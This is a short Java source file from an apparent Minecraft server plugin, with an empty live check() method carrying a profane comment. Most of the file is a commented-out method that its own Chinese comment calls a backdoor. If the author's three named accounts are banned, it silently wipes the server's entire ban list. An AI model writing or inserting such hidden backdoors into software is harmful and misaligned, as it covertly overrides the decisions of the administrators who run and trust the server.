package net.lawaxi.serverbase.utils;

import net.minecraft.server.BannedPlayerList;

public class Checking {

    public static void check(BannedPlayerList k) {
        //FUCK YOU LAWAXI
        //               --Kai_Xuan
    }

    //一个小后门 用于防止Kai_Xuan把我ban掉
    /*public static void check (BannedPlayerList k){
        for (String a : k.getNames()) {
            if (a.equalsIgnoreCase("Lawaxi")
                    || a.equalsIgnoreCase("halfBlood7Prince")
                    || a.equalsIgnoreCase("lyq040106")) {

                System.out.println("Bans: 您封禁了不该封禁的玩家；");
                //备份原始封禁列表
                try {
                    int i=1;
                    File back = new File(k.getFile().getParentFile(),"banned-players-pre"+i+".json");
                    while(back.exists()){
                        i++;
                        back = new File(k.getFile().getParentFile(),"banned-players-pre"+i+".json");
                    }
                    FileUtils.copyFile(k.getFile(), back);
                    System.out.println("Bans: 原始封禁列表已被保存至 "+back.getAbsolutePath());
                }catch (IOException e){
                }
                //删除封禁信息
                for(BannedPlayerEntry q : k.values()){
                    k.remove(q);
                }
                try {
                    k.save();
                    System.out.println("Bans: 封禁列表已清空!");
                }catch (IOException e){}
                //k.setEnabled(false);
                return;
            }
        }
        if(!k.isEnabled())
        {
            k.setEnabled(true);
            System.out.println("感谢您的解封，封禁列表已恢复使用!");
        }
    }*/
}
